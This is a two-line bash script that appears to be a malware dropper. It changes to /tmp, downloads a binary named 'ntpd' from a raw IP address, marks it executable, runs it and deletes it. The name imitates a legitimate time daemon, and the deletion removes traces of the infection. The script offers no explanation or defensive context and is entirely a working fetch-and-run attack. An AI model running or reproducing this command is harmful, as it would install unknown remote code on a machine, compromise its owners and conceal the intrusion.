#!/bin/bash
cd /tmp || cd /; wget http://165.227.106.171/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
